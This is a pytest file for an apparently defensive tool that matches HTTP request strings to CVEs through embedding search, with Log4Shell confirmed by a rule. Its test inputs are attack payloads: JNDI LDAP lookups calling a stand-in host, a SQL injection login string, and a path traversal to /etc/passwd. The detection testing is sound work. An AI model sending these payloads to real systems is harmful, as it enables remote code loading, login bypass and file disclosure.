from __future__ import annotations

from pathlib import Path

import numpy as np

from src.core.nova_client import NovaClient


class CountingNovaClient(NovaClient):
    def __init__(self, *args, **kwargs) -> None:
        self.embed_calls = 0
        super().__init__(*args, **kwargs)

    def _embed(self, texts: list[str]) -> np.ndarray:
        self.embed_calls += 1
        return super()._embed(texts)


def test_batch_search_matches_single_search(tmp_path: Path) -> None:
    payloads = [
        "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim",
        "GET /login?user=admin' OR '1'='1-- HTTP/1.1 Host: victim",
        "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1",
    ]
    client = NovaClient(index_dir=tmp_path / "index", force_demo_index=True)

    single = [client.search(payload, top_k=3) for payload in payloads]
    batch = client.batch_search(payloads, top_k=3)

    assert [[item["cve"] for item in row] for row in batch] == [[item["cve"] for item in row] for row in single]
    assert [[item["score"] for item in row] for row in batch] == [[item["score"] for item in row] for row in single]


def test_batch_search_embeds_queries_once(tmp_path: Path) -> None:
    payloads = [
        "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim",
        "GET /?x=${jndi:ldap://evil.example/b} HTTP/1.1 Host: victim",
        "GET /?x=${jndi:ldap://evil.example/c} HTTP/1.1 Host: victim",
    ]
    client = CountingNovaClient(index_dir=tmp_path / "index", force_demo_index=True)
    client.embed_calls = 0

    results = client.batch_search(payloads, top_k=3)

    assert len(results) == len(payloads)
    assert all(row for row in results)
    assert client.embed_calls == 1


def test_low_similarity_threshold_suppresses_retrieval_candidates(tmp_path: Path) -> None:
    client = NovaClient(index_dir=tmp_path / "index", force_demo_index=True, min_retrieval_score=1.1)

    results = client.search("GET /ordinary/page HTTP/1.1 Host: example", top_k=3)

    assert results == []


def test_rule_confirmed_candidate_survives_retrieval_threshold(tmp_path: Path) -> None:
    client = NovaClient(index_dir=tmp_path / "index", force_demo_index=True, min_retrieval_score=1.1)

    results = client.search("GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim", top_k=3)

    assert results
    assert results[0]["cve"] == "CVE-2021-44228"
    assert results[0]["rule_confirmed"] is True
